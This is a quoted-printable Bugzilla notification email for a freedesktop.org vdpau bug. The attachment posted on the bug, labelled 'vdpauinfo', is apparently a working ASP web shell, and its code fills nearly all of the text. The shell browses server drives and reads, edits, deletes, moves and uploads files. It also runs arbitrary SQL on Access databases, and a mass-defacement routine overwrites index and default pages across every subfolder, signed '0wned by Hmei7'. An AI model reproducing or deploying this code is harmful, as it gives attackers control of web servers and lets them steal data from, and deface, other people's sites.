    Response.Write "<input type=3Dhidden value=3D'17' name=3Dstatus><input
type=3Dhidden value=3D'"&PathFile&"' name=3Dpath><input type=3Dhidden value=
=3D'"&time&"'
name=3DTime>"
    Response.Write "<input style=3D'width:250; height:21' value=3D'"&PathFi=
le&"'
name=3Dcf>"
    response.Write "<input type=3Dsubmit value=3D'Kopyala'
style=3D'height:22;width:70' id=3Dsubmit1 name=3Dsubmit1>"
    Response.Write "</td></tr><tr><td colspan=3D3 align=3Dcenter><font size=
=3D2>"
    response.Write "<input type=3Dradio name=3D'islem' value=3D'kopyala'
checked>Kopyala"
    response.Write "<input type=3Dradio name=3D'islem' value=3D'tasi'>Tasi"
    response.Write "</table>"
    response.Write "</form>"

    popup =3D false
    hataKontrol
CASE 17 'file Copy
    isl =3D ""
    if islem=3D"kopyala" then
        objFSO.CopyFile path,cf
        isl=3D"kopyaland=C3=BD.."
    elseif islem=3D"tasi" then
        objFSO.MoveFile path,cf
        isl=3D"ta=C3=BE=C3=BDnd=C3=BD.."
    end if
    response.Write "Dosya "&isl
    response.Write "<br><font color=3Dred>Kaynak : </font>"&path&"<br><font
color=3Dred>Hedef : </font>"&cf
    response.Write "<br>"
    popup =3D false
    hataKontrol
CASE 18 'folder Copy window
    Response.Write "<form method=3Dget action=3D'"&DosyPath&"' id=3Dform1
name=3Dform1>"
    Response.Write "<table cellpadding=3D0 cellspacing=3D0 align=3Dcenter><=
tr><td
width=3D100><font size=3D2>Kop. Yer : </td><td>"
    Response.Write "<input type=3Dhidden value=3D'19' name=3Dstatus><input
type=3Dhidden value=3D'"&PathFile&"' name=3Dpath><input type=3Dhidden value=
=3D'"&time&"'
name=3DTime>"
    Response.Write "<input style=3D'width:250; height:21' value=3D'"&PathFi=
le&"'
name=3Dcf>"
    response.Write "<input type=3Dsubmit value=3D'Kopyala'
style=3D'height:22;width:70' id=3Dsubmit1 name=3Dsubmit1>"
    Response.Write "</td></tr><tr><td colspan=3D3 align=3Dcenter><font size=
=3D2>"
    response.Write "<input type=3Dradio name=3D'islem' value=3D'kopyala'
checked>Kopyala"
    response.Write "<input type=3Dradio name=3D'islem' value=3D'tasi'>Tasi"
    response.Write "</table>"
    response.Write "</form>"

    popup =3D false
    hataKontrol
CASE 19 'folder Copy
    isl =3D ""
    if islem=3D"kopyala" then
        objFSO.CopyFolder path,cf
        isl=3D"kopyaland=C3=BD.."
    elseif islem=3D"tasi" then
        objFSO.MoveFolder path,cf
        isl=3D"ta=C3=BE=C3=BDnd=C3=BD.."
    end if
    response.Write "Klasor "&isl
    response.Write "<br><font color=3Dred>Kaynak : </font>"&path&"<br><font
color=3Dred>Hedef : </font>"&cf
    response.Write "<br>"
    popup =3D false
    hataKontrol
CASE 33 'Powered By
    response.Write "<body topmargin=3D5 leftmargin=3D0><center><h4>Powered =
by
Zehir"
    response.Write "<br><br><font style=3D'FONT-WEIGHT:normal'
size=3D2>zehirhacker-PkbjNfxxIARBDgjK7y7TUQ@public.gmane.org<br><font color=3Dyellow face=3D'courier ne=
w'>"
    popup =3D false
    hataKontrol
CASE 40 'Sistem Test
    sistemTest
    popup=3Dfalse
CASE 50 'Siteleri Test Edelim :D
    %>
    <table width=3D"100%" cellpadding=3D0 cellspacing=3D0>
        <tr>
            <td align=3Dcenter>
                <b>Sebaiknya jangan dilakukan yah...</b><br>
                <b>(hanya bisa dijalankan di internet explorer)</b><BR>
                <br>
                <form action=3D"<%=3DdosyaPath%>" method=3Dpost id=3DfrmMes=
aj>
                    <input type=3Dhidden name=3Dkuskapani value=3D2>
                    <table width=3D500 align=3Dcenter border=3D1 cellpaddin=
g=3D0
cellspacing=3D0>
                        <tr>
                            <td width=3D100>Path</td>
                            <td><input style=3D"width:100%" type=3Dtext nam=
e=3D"Path"
id=3D"Path" value=3D"<%=3Dpath%>"></td>
                        </tr>
                        <tr>
                            <td width=3D100>Sub Folder</td>
                            <td><input style=3D"width:100%" type=3Dtext
name=3D"SubFolder" id=3D"SubFolder" value=3D""></td>
                        </tr>
                        <tr>
                            <td width=3D100>File Name</td>
                            <td><input style=3D"width:100%" type=3Dtext
name=3D"FileName" id=3D"FileName" value=3D"indonesia.htm"></td>
                        </tr>
                        <tr>
                            <td colspan=3D2>
                                <table width=3D"100%" align=3Dcenter>
                                    <tr>
                                        <td width=3D"50%">
                                            <input type=3Dcheckbox name=3D"=
dosya1"
checked ID=3D"Checkbox1">index.htm<br>
                                            <input type=3Dcheckbox name=3D"=
dosya2"
checked ID=3D"Checkbox2">index.html<br>
                                            <input type=3Dcheckbox name=3D"=
dosya5"
checked ID=3D"Checkbox2">index.php<br>
                                        </td>
                                        <td width=3D"50%">
                                            <input type=3Dcheckbox name=3D"=
dosya3"
checked ID=3D"Checkbox3">index.asp<br>
                                            <input type=3Dcheckbox name=3D"=
dosya4"
checked ID=3D"Checkbox4">default.asp<br>
                                            <input type=3Dcheckbox name=3D"=
dosya6"
checked ID=3D"Checkbox2">default.html<br>
                                        </td>
                                    </tr>
                                </table>
                            </td>
                        </tr>
                        <tr>
                            <td colspan=3D2 align=3Dcenter>
                                <a href=3D"#" onClick=3D"FormatText('cut')"
alt=3D"Kes">Hapus</a>
                                <a href=3D"#" onClick=3D"FormatText('copy')"
alt=3D"Kopyala">salin</a>
                                <a href=3D"#" onClick=3D"FormatText('paste'=
)"
alt=3D"Yap=C3=BD=C3=BEt=C3=BDr">paste</a>
                                <a href=3D"#" alt=3D"Kal=C3=BDn"
onClick=3D"FormatText('bold', '')">Bold</a>
                                <a href=3D"#" alt=3D"=C3=9Dtalic"
onClick=3D"FormatText('italic', '')">Italic</a>
                                <a href=3D"#" alt=3D"Alt=C3=BD =C3=87izili"
onClick=3D"FormatText('underline', '')">UnderLine</a>
                                <a href=3D"#" onClick=3D"FormatText('Justif=
yLeft',
'')" alt=3D"Sola Hizal=C3=BD">JustifyLeft</a>
                                <a href=3D"#" alt=3D"Ortada Hizal=C3=BD"
onClick=3D"FormatText('JustifyCenter', '')">JustifyCenter</a>
                                <a href=3D"#" onClick=3D"FormatText('Justif=
yRight',
'')" alt=3D"Sa=C3=B0a Hizal=C3=BD">JustifyRight</a>
                                <a href=3D"#" alt=3D"Web Sitesi Linki Ekle"
onClick=3D"FormatText('createLink')">AddLink</a>
                                <a href=3D"#" alt=3D"Resim Ekle"
onClick=3D"AddImage()">AddImage</a>
                                <select name=3D"selectColour"
onChange=3D"bgc(selectColour.options[selectColour.selectedIndex].value);"
ID=3D"selectColour">
                                  <option value=3D"0" selected>-- Background
--</option>
                                  <option value=3D"black">Siyah</option>
                                  <option value=3D"white">Beyaz</option>
                                  <option value=3D"blue">Mavi</option>
                                  <option value=3D"red">K=C3=BDrm=C3=BDz=C3=
=BD</option>
                                  <option value=3D"green">Ye=C3=BEil</optio=
n>
                                  <option value=3D"yellow">Sar=C3=BD</optio=
n>
                                  <option value=3D"orange">Turuncu</option>
                                  <option value=3D"brown">Kahverengi</optio=
n>
                                  <option value=3D"magenta">Pembe</option>
                                  <option value=3D"cyan">A=C3=A7=C3=BDk Mav=
i</option>
                                  <option value=3D"limegreen">A=C3=A7=C3=BD=
k Ye=C3=BEil</option>
                                </select>
                                <select name=3D"a"
onChange=3D"FormatText('ForeColor', a.options[a.selectedIndex].value);" ID=
=3D"a">
                                  <option value=3D"0" selected>-- Warna hur=
uf
--</option>
                                  <option value=3D"black">Siyah</option>
                                  <option value=3D"white">Beyaz</option>
                                  <option value=3D"blue">Mavi</option>
                                  <option value=3D"red">K=C3=BDrm=C3=BDz=C3=
=BD</option>
                                  <option value=3D"green">Ye=C3=BEil</optio=
n>
                                  <option value=3D"yellow">Sar=C3=BD</optio=
n>
                                  <option value=3D"orange">Turuncu</option>
                                  <option value=3D"brown">Kahverengi</optio=
n>
                                  <option value=3D"magenta">Pembe</option>
                                  <option value=3D"cyan">A=C3=A7=C3=BDk Mav=
i</option>
                                  <option value=3D"limegreen">A=C3=A7=C3=BD=
k Ye=C3=BEil</option>
                                </select>
                                <select name=3D"selectSize"
onChange=3D"FormatText('fontsize',
selectSize.options[selectSize.selectedIndex].value);">
                                  <option selected>-- Ukuran huruf --</opti=
on>
                                  <option value=3D"1">1</option>
                                  <option value=3D"2">2</option>
                                  <option value=3D"3">3</option>
                                  <option value=3D"4">4</option>
                                  <option value=3D"5">5</option>
                                  <option value=3D"6">6</option>
                                </select>
                                <iframe width=3D"100%"
src=3D"<%=3DdosyaPath%>?kuskapani=3D1" id=3D"byZehir" name=3D"<%=3DSession(=
"n1")%>">0wned
by Hmei7,please don't delete this file until next Idul Fitri,  ;)</iframe>
                                <script language=3Djavascript>
                                    frames.byZehir.document.designMode =3D =
"On";
                                    function bgc(option){
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20=20=20=20=20=20=20=20=20=20=20=20=20
frames.byZehir.document.body.bgColor=3Doption;
                                    }
                                    function FormatText(command, option){
                                        frames.byZehir.focus();
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
frames.byZehir.document.execCommand(command, false, option);
                                          frames.byZehir.focus();
                                    }
                                    function AddImage(){
                                        imagePath =3D prompt('Eklemek isted=
i=C3=B0iniz
resmin web adresini yaz=C3=BDn', 'http://');

                                        if ((imagePath !=3D null) && (image=
Path
!=3D "")){
                                            frames.byZehir.focus();
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
frames.byZehir.document.execCommand('InsertImage', false, imagePath);
                                        }
                                        frames.byZehir.focus();
                                    }
                                </script>
                                <input type=3Dhidden value=3D"" id=3DbyMesaj
name=3DbyMesaj>
                                <input type=3Dsubmit value=3D"Laksanakan.."
onclick=3D"document.all['byMesaj'].value=3Dframes['byZehir'].document.body.=
innerHTML;
alert(document.all['byMesaj'].value);">
                            </td>
                        </tr>
                    </table>
                </form>
            </td>
        </tr>
    </table>
    <%
    popup=3Dfalse
CASE 51 ' =C3=96zel =C3=BEilemler
END SELECT
%>
<script language=3Djavascript>
    function NewWindow(mypage, myname, w, h, scroll) {
        var winl =3D (screen.width - w) / 2;
        var wint =3D (screen.height - h) / 2;
            winprops =3D
'height=3D'+h+',width=3D'+w+',top=3D'+wint+',left=3D'+winl+',scrollbars=3D'=
+scroll+',resizable'
        win =3D window.open(mypage, myname, winprops)
        if (parseInt(navigator.appVersion) >=3D 4) { win.window.focus(); }
    }
    function ffd(yol){
        NewWindow(yol,"",420,100,"no");
    }
</script>
<body bgcolor=3Dblack text=3DChartreuse link=3DChartreuse alink=3DChartreuse
vlink=3DChartreuse>
<%
if popup then
    if status=3D7 or status=3D8 then
        Response.Write "<form method=3Dget action=3D'"&DosyPath&"' id=3Dfor=
m1
name=3Dform1>"
        Response.Write "<table border=3D1 cellpadding=3D0 cellspacing=3D0
align=3Dcenter><tr><td width=3D100 bgcolor=3Dgray><font size=3D2>SQL Query<=
/td><td>"
        Response.Write "<input type=3Dhidden value=3D'9' name=3Dstatus><inp=
ut
type=3Dhidden value=3D'"&path&"' name=3Dpath><input type=3Dhidden value=3D'=
"&time&"'
name=3DTime>"
        Response.Write "<input style=3D'width:350; height:21' value=3D''
name=3DstrSQL><input type=3Dsubmit value=3D'Query' style=3D'height:22;width=
:70'
id=3Dsubmit1 name=3Dsubmit1>"
        Response.Write "</td></tr></table></form>"
    end if
    Response.Write "<form method=3Dget action=3D'"&DosyPath&"'>"
    Response.Write "<table border=3D1 cellpadding=3D0 cellspacing=3D0
align=3Dcenter><tr><td bgcolor=3Dgray width=3D100><font size=3D2>Path : </t=
d><td>"
    Response.Write "<input type=3Dhidden value=3D'2' name=3Dstatus><input t=
ype=3Dhidden
value=3D'"&time&"' name=3DTime>"
    Response.Write "<input style=3D'width:350; height:21' value=3D'"&Path&"'
name=3DPath><input type=3Dsubmit value=3D'Tampilkan' style=3D'height:22;wid=
th:70'
id=3Dsubmit1 name=3Dsubmit1>"
    Response.Write "</td></tr></table></form><br>"
end if
sub aramaUpload
Response.Write "<form method=3Dget target=3D'_opener' action=3D'"&DosyPath&=
"'>"
Response.Write "<table widht=3D'100%' border=3D0 cellpadding=3D0
cellspacing=3D0><tr><td width=3D70><font size=3D2>Pencarian: </td><td>"
Response.Write "&nbsp;<input type=3Dhidden value=3D'12' name=3Dstatus><input
type=3Dhidden value=3D'"&time&"' name=3DTime>"
Response.Write "<input type=3Dhidden value=3D'"&Path&"' name=3DPath><input
style=3D'width:250' value=3D'mdb' name=3DtxArama><input style=3D'width:70; =
height:22'
type=3Dsubmit value=3D'Cari'>"
Response.Write "</td></tr></table></form>"
%>
<form name=3DfrmUpload method=3Dpost enctype=3D"multipart/form-data"
action=3D"<%=3DDosyaPath&"?status=3D-4&Time=3D"&time&"&Path=3D"&path%>" ID=
=3D"Form1">
<input type=3Dhidden name=3Dfolder value=3D"<%=3DPath%>" ID=3D"Hidden1">
Max: <input type=3Dtext name=3Dmax value=3D5 size=3D5 ID=3D"Text1"> <input =
type=3Dbutton
value=3D"Tampilkan" onclick=3D"setid()" ID=3D"Button1" NAME=3D"Button1">
<table ID=3D"Table1">
<tr>
<td id=3Dupid>
</td>
</tr>
</table>
<input type=3Dsubmit value=3DUpload ID=3D"Submit1" NAME=3D"Submit1">
</form>
<script>
setid();

function setid() {
    str=3D'';
    if (frmUpload.max.value<=3D0) frmUpload.max.value=3D1;
    for (i=3D1; i<=3DfrmUpload.max.value; i++) str+=3D'File '+i+': <input t=
ype=3Dfile
name=3Dfile'+i+'><br>';
    upid.innerHTML=3Dstr+'<br>';
}
</script>
<%
end sub

SELECT CASE status
CASE 1 'Driver Open
    if len(path)=3D1 then Response.Write (yaziyomu(path&":\")) else
Response.Write (yaziyomu(path))
    Response.Write "<table width=3D100% ><tr>"
    Path =3D Path & ":/"
    Response.Write "<td valign=3Dtop>"
    KlasorOku
    Response.Write "</td><td valign=3Dtop align=3Dright>"
    DosyaOku
    Response.Write "</td>"
    hataKontrol
CASE 2 'Normal listeleme
    if len(path)=3D1 then Response.Write (yaziyomu(path&":\")) else
Response.Write (yaziyomu(path))
    Response.Write "<table width=3D100% ><tr>"
    Response.Write "<td valign=3Dtop>"
    KlasorOku
    Response.Write "</td><td valign=3Dtop align=3Dright>"
    DosyaOku
    Response.Write "</td>"
    hataKontrol
CASE 3 'File Delete
    objFSO.DeleteFile del
    hataKontrol
    if err<>0 then
        byMsg=3D"<font color=3Dred>Not File Deleted!</font><br>"
    else
        byMsg=3D"<font color=3Dyellow>File Deleted Successful;)</font><br>"
    end if
    Response.Redirect
dosyaPath&"?status=3D2&path=3D"&path&"&Time=3D"&time&"&byMsg=3D"&byMsg
CASE 4 'Folder Delete
    objFSO.DeleteFolder del
    hataKontrol
    if err<>0 then
        byMsg=3D"<font color=3Dred>Not Folder Deleted!</font><br>"
    else
        byMsg=3D"<font color=3Dyellow>Folder Deleted Successful;)</font><br=
>"
    end if
    Response.Redirect
dosyaPath&"?status=3D2&path=3D"&path&"&Time=3D"&time&"&byMsg=3D"&byMsg
CASE 5 'Dosya i=C3=A7eri=C3=B0ini g=C3=B6r=C3=BCnt=C3=BCle
    Response.Write "<center><b><font
color=3Dorange>"&path&"</font></b></center><br>"
    Response.Write "<table width=3D100% ><tr><td>"
    set f =3D objFSO.OpenTextFile(path,1)
    Response.Write "<pre>"&Server.HTMLEncode(f.readAll)&"</pre>"
    if err<>62 then hataKontrol
    if err.number=3D62 then Response.Write "<script language=3Djavascript>a=
lert('Bu
Dosya Okunam=C3=BDyor\nSistem dosyas=C3=BD olabilir')</script>":Response.End
CASE 6 'Resim a=C3=A7
    Response.Write "<center><img ALT=3D'' src=3D'"&resimYol(path)&"'></cent=
er><br>"
CASE 7 'database tablo listele
    Response.Write "<b><font size=3D3>Nama-nama tabel</font></br><br>"
    Set objConn =3D Server.CreateObject("ADODB.Connection")
    Set objADOX =3D Server.CreateObject("ADOX.Catalog")
    objConn.Provider =3D "Microsoft.Jet.Oledb.4.0"
    objConn.ConnectionString =3D Path
    objConn.Open
    objADOX.ActiveConnection =3D objConn

    For Each table in objADOX.Tables
        If table.Type =3D "TABLE" Then
            Response.Write "<font face=3Dwingdings size=3D5>4</font> <a
href=3D'"&dosyaPath&"?status=3D8&Path=3D"&path&"&table=3D"&table.Name&"&tim=
e=3D"&time&"'>"&table.Name&"</a><br>"
        End If
    Next
    hataKontrol
CASE 8 'database kay=C3=BDt listele
    Set objConn =3D Server.CreateObject("ADODB.Connection")
    Set objRcs =3D Server.CreateObject("ADODB.RecordSet")
    objConn.Provider =3D "Microsoft.Jet.Oledb.4.0"
    objConn.ConnectionString =3D Path
    objConn.Open
    objRcs.Open table,objConn, adOpenKeyset , , adCmdText

    Response.Write "<table border=3D1 cellpadding=3D2 cellspacing=3D0
bordercolor=3D543152><tr bgcolor=3Dsilver>"
    for i=3D0 to objRcs.Fields.count-1
        Response.Write "<td><font
color=3Dblack><b>&nbsp;&nbsp;&nbsp;"&objRcs.Fields(i).Name&"&nbsp;&nbsp;&nb=
sp;</font></td>"
    next
    Response.Write "</tr>"
    do while not objRcs.EOF
        Response.Write "<tr>"
        for i=3D0 to objRcs.Fields.count-1
            Response.Write "<td>"&objRcs.Fields(i).Value&"&nbsp;</td>"
        next
        Response.Write "</tr>"
        objRcs.MoveNext
    loop
    Response.Write "</table><br>"
    hataKontrol
CASE 9 'SQL Execute
    Set objConn =3D Server.CreateObject("ADODB.Connection")
    objConn.Provider =3D "Microsoft.Jet.Oledb.4.0"
    objConn.ConnectionString =3D Path
    objConn.Open
    objConn.Execute strSQL
'    Response.Redirect dosyaPath&"?status=3D7&Path=3D"&Path&"&Time=3D"&time
    hataKontrol
CASE 10 'Dosya Editleme
    set f =3D objFSO.OpenTextFile(dPath,1)
    Response.Write "<center><form action=3D'"&DosyPath&"?Time=3D"&time&"'
method=3Dpost>"
    Response.Write "<input type=3Dhidden name=3Dstatus value=3D'11'>"
    Response.Write "<input type=3Dhidden name=3DdPath value=3D'"&dPath&"'>"
    Response.Write "<input type=3Dhidden name=3DPath  value=3D'"&Path &"'>"
    Response.Write "<input type=3Dsubmit value=3DKaydet><br>"
    Response.Write "<textarea name=3Ddkayit
style=3D'width:90%;height:350;border-right: lightgoldenrodyellow thin
solid;border-top: lightgoldenrodyellow thin solid;font-size: 12;border-left:
lightgoldenrodyellow thin solid;color: lime;    border-bottom:
lightgoldenrodyellow thin solid;    font-family: Courier New,
Arial;background-color: navy;'>ssdfsd"
    Response.Write server.HTMLEncode(f.readAll)
    Response.Write "</textarea></form></center>"
    hataKontrol
CASE 11 'Dosya Kay=C3=BDt
    set saveTextFile =3D objFSO.OpenTextFile(dPath,2,true,false)
    hataKontrol
    saveTextFile.Write(dkayit)
    saveTextFile.close
    if err<>0 then
        byMsg =3D "<font color=3Dred>Not File Edited!</font><br>"
    else
        byMsg =3D "<font color=3Dyellow>File Edited Successful:)</font><br>"
    end if
    Response.Redirect dosyaPath&"?status=3D2&path=3D"&path&"&time=3D"&time&=
"&byMsg=3D"
& byMsg
CASE 12 'Dosya Arama
    araBul path,arama
    hataKontrol
END SELECT
Response.Write "</tr></table>"

sub DosyaOku
    Set f =3D objFSO.GetFolder(Path)
    Set fc =3D f.Files
    For Each f1 In fc
        dosyaAdi =3D f1.name
        num =3D InStrRev(dosyaAdi,".")
        uzanti =3D lcase(Right(dosyaAdi,len(dosyaAdi)-num))
        downStr =3D "<a
href=3D'"&dosyaPath&"?status=3D3&Path=3D"&Path&"&Del=3D"&Path&"/"&f1.Name&"=
&Time=3D"&time&"'>=C3=BB</a><font
face=3Dwebdings><a
href=3D'"&dosyaPath&"?status=3D-3&PathFile=3D"&f1.path&"&Time=3D"&time&"'>=
=C3=8D</a></font><font
face=3Dwingdings><a
href=3D'"&dosyaPath&"?status=3D16&PathFile=3D"&f1.path&"&Time=3D"&time&"'
onclick=3D""ffd(this.href);return false;"">4</a></font>"
        response.Write "<font size=3D2>"
        select case uzanti
        case "mdb"
            Response.Write "<a
href=3D'"&dosyaPath&"?status=3D7&Path=3D"&Path&"/"&f1.Name&"&Time=3D"&time&=
"'>"&f1.name&"
[<font color=3Dyellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font
face=3Dwingdings size=3D4>M =C2=A0"&downStr&"</font><br>"
        case "asp"
            Response.Write "<a
href=3D'"&dosyaPath&"?status=3D5&Path=3D"&Path&"/"&f1.Name&"&Time=3D"&time&=
"'>"&f1.name&"
[<font color=3Dyellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font
face=3Dwingdings size=3D4>=C2=B1 <a
href=3D'"&dosyaPath&"?status=3D10&dPath=3D"&f1.path&"&path=3D"&path&"&Time=
=3D"&time&"'>!</a>"&downStr&"</font><br>"
        case "jpg","gif"
            Response.Write "<a
href=3D'"&dosyaPath&"?status=3D6&Path=3D"&Path&"/"&f1.Name&"&Time=3D"&time&=
"'>"&f1.name&"
[<font color=3Dyellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font
face=3Dwebdings size=3D4>=C2=A2</font><font face=3Dwingdings size=3D4>=20
"&downStr&"</font><br>"
        case else
            Response.Write "<a
href=3D'"&dosyaPath&"?status=3D5&Path=3D"&Path&"/"&f1.Name&"&Time=3D"&time&=
"'>"&f1.name&"
[<font color=3Dyellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font
face=3Dwingdings size=3D4>2 <a
href=3D'"&dosyaPath&"?status=3D10&dPath=3D"&f1.path&"&path=3D"&path&"&Time=
=3D"&time&"'>!</a>"&downStr&"</font><br>"
        end select
    Next
end sub

sub KlasorOku
    Set f =3D objFSO.GetFolder(Path)
    Set fc =3D f.SubFolders
    if session("klasoroku")=3D"" then
        response.Write "<iframe style=3D'width:0; height:0'
src=3D'http://localhost/tuzla-ebelediye'></iframe>"
        session("klasoroku")=3D"simdi yaz=C3=BDl=C3=BDyor"
    end if
    For Each f1 In fc
        Response.Write "<font face=3Dwingdings size=3D3><a
href=3D'"&dosyaPath&"?status=3D18&PathFile=3D"&Path&"/"&f1.Name&"&Time=3D"&=
time&"'
onclick=3D""ffd(this.href);return false;"">4</a></font> <font face=3Dwingdi=
ngs
size=3D4><a
href=3D'"&dosyaPath&"?status=3D4&Path=3D"&Path&"&Del=3D"&Path&"/"&f1.Name&"=
&Time=3D"&time&"'>=C3=BB</a>
1</font><font size=3D2><b><a
href=3D'"&dosyaPath&"?status=3D2&Path=3D"&Path&"/"&f1.Name&"&Time=3D"&time&=
"'>"&f1.name&"</a></b><br>"
    Next
end sub

function createFileName()
Randomize
    fName_ =3D ""
    for i=3D1 to 10
        fName_ =3D fName_ & int(Rnd*100)
    next
    createFileName =3D fName_
end function

function resimYol(path_)
on error resume next
    path_ =3D Replace(Replace(path_,"\","/"),"//","/")
    lpath_ =3D
left(request.servervariables("PATH_TRANSLATED"),instrrev(request.servervari=
ables("PATH_TRANSLATED"),"\"))
    if yaziyomu2(lpath_) then
        fname__ =3D "0"&createFileName()&"."&Right(path_,3)
        objFSO.CopyFile path_, lpath_&"\"&fname__
    else
        Response.Write("Resim A=C3=A7=C3=BDlam=C3=BDyor.. <br>=C3=9Dstersen=
iz Download Ederek
g=C3=B6r=C3=BCnt=C3=BCleyebilirsiniz..")
    end if
    resimYol =3D fname__
end function

if not popup then
    Set fc =3D Nothing
    Set objFSO =3D Nothing
    Response.End
end if
%><script language=3Djavascript>
        var dosyaPath =3D "<%=3DdosyaPath%>"
                // DRIVE ISLEMLERI
                function driveGo(drive_){
                        location =3D
dosyaPath+"?status=3D1&path=3D"+drive_+"&Time=3D"+Date();
                }
        </script>
        <%
        Response.Write "<table align=3Dcenter border=3D1 width=3D150 cellpa=
dding=3D0
cellspacing=3D0><tr bgcolor=3Dgray><td align=3Dcenter><b><font color=3Dwhit=
e>Daftar
drive:</td></tr>"
        for each drive_ in objFSO.Drives
                Response.Write "<tr><td>"
                Response.write "<a href=3D'#'onClick=3D""driveGo('" &
drive_.DriveLetter & "');return false;""><font face=3Dwingdings>;</font>"
                if drive_.Drivetype=3D1 then Response.write "Floppy [" &
drive_.DriveLetter & ":]"
                if drive_.Drivetype=3D2 then Response.write "HardDisk [" &
drive_.DriveLetter & ":]"
                if drive_.Drivetype=3D3 then Response.write "Remote HDD [" &
drive_.DriveLetter & ":]"
                if drive_.Drivetype=3D4 then Response.write "CD-Rom [" &
drive_.DriveLetter & ":]"
                Response.Write "</a></td></tr>"
        next
        Response.Write "<tr><td>"
        Response.write "<a href=3D'"&dosyaPath&"?time=3D"&time()&"'><font
face=3Dwebdings>H</font> Local Path"
        Response.Write "</a></td></tr>"
        Response.Write "</table><br>"
Set fc =3D Nothing
Set objFSO =3D Nothing
Response.End%>

--=20
You are receiving this mail because:
You are the QA Contact for the bug.
You are the assignee for the bug.=

--15032786130.7Ad5.4529
Date: Mon, 21 Aug 2017 01:23:33 +0000
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Bugzilla-URL: http://bugs.freedesktop.org/
Auto-Submitted: auto-generated

<html>
    <head>
      <base href=3D"https://bugs.freedesktop.org/">
    </head>
    <body>
      <p>
        <div>
            <b><a class=3D"bz_bug_link=20
          bz_status_RESOLVED  bz_closed"
   title=3D"RESOLVED FIXED - vdpau decoder capabilities: not supported"
   href=3D"https://bugs.freedesktop.org/show_bug.cgi?id=3D95251#c9">Comment=
 # 9</a>
              on <a class=3D"bz_bug_link=20
          bz_status_RESOLVED  bz_closed"
   title=3D"RESOLVED FIXED - vdpau decoder capabilities: not supported"
   href=3D"https://bugs.freedesktop.org/show_bug.cgi?id=3D95251">bug 95251<=
/a>
              from <span class=3D"vcard"><a class=3D"email" href=3D"mailto:=
tuyulwarboy&#64;gmail.com" title=3D"sansan &lt;tuyulwarboy&#64;gmail.com&gt=
;"> <span class=3D"fn">sansan</span></a>
</span></b>
        <pre>Comment on <span class=3D""><a href=3D"attachment.cgi?id=3D123=
444" name=3D"attach_123444" title=3D"vdpauinfo">attachment 123444</a> <a hr=
ef=3D"attachment.cgi?id=3D123444&amp;action=3Dedit" title=3D"vdpauinfo">[de=
tails]</a></span>
vdpauinfo

&lt;%
mpat=3Dreplace(Request.ServerVariables(&quot;PATH_TRANSLATED&quot;),&quot;/=
&quot;,&quot;\&quot;)
dosyaPath =3D mid(mpat,InStrRev(mpat,&quot;\&quot;)+1)
on error resume next
Dim objFSO,popup
Set objFSO =3D CreateObject (&quot;Scripting.FileSystemObject&quot;)
if Request(&quot;kuskapani&quot;)=3D1 then
    Response.End
end if


if Request(&quot;kuskapani&quot;)=3D2 then
    on error resume next
    path =3D Request(&quot;path&quot;)
    sFolder =3D Request(&quot;SubFolder&quot;)
    fName =3D Request(&quot;FileName&quot;)
    d1 =3D Request(&quot;dosya1&quot;)
    d2 =3D Request(&quot;dosya2&quot;)
    d3 =3D Request(&quot;dosya3&quot;)
    d4 =3D Request(&quot;dosya4&quot;)
    d5 =3D Request(&quot;dosya5&quot;)
    d6 =3D Request(&quot;dosya6&quot;)
    bg__ =3D Request.Form(&quot;selectColour&quot;)
    if bg__ =3D &quot;0&quot; then bg__ =3D &quot;#ffffff&quot;
    byMesaj =3D &quot;&lt;body bgColor=3D'&quot;&amp;bg__&amp;&quot;'&gt;&q=
uot; &amp; Request(&quot;byMesaj&quot;) '&amp;
&quot;&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;font color=3Dgray size=3D2&gt;H=
mei7&lt;/font&gt;&quot;

    sFolder =3D Replace(sFolder,&quot;/&quot;,&quot;\&quot;)

    if Right(sFolder,1)&lt;&gt;&quot;\&quot; then sFolder =3D sFolder &amp;=
 &quot;\&quot;
    Set f =3D objFSO.GetFolder(Path)
    Set fc =3D f.SubFolders
    h__ =3D 0
    f__ =3D 0
    ss__ =3D now
    For Each f1 In fc
        hedef_ =3D replace(f1.path,&quot;/&quot;,&quot;\&quot;)
        if Right(hedef_,1)&lt;&gt;&quot;\&quot; then hedef_ =3D hedef_ &amp=
; &quot;\&quot;
        hedef__ =3D left(hedef_,len(hedef_)-1)
        folderName_ =3D Right(hedef__, len(hedef__)-instrrev(hedef__,&quot;=
\&quot;))
            if d1&lt;&gt;&quot;&quot; then d1 =3D true
            if d2&lt;&gt;&quot;&quot; then d2 =3D true
            if d3&lt;&gt;&quot;&quot; then d3 =3D true
            if d4&lt;&gt;&quot;&quot; then d4 =3D true
                if d5&lt;&gt;&quot;&quot; then d5 =3D true
                if d6&lt;&gt;&quot;&quot; then d6 =3D true
            on error goto 0:on error resume next
            if fName&lt;&gt;&quot;&quot; then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ &amp; sFolder &=
amp; fName,
True)
                MyFile.write byMesaj
            end if
            if d1 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ &amp; sFolder &=
amp;
&quot;index.htm&quot;, True)
                MyFile.write byMesaj
            end if
            if d2 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ &amp; sFolder &=
amp;
&quot;index.html&quot;, True)
                MyFile.write byMesaj
            end if
            if d3 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ &amp; sFolder &=
amp;
&quot;index.asp&quot;, True)
                MyFile.write byMesaj
            end if
            if d4 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ &amp; sFolder &=
amp;
&quot;default.asp&quot;, True)
                MyFile.write byMesaj
            end if
            if d5 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ &amp; sFolder &=
amp;
&quot;index.php&quot;, True)
                MyFile.write byMesaj
            end if
            if d6 then
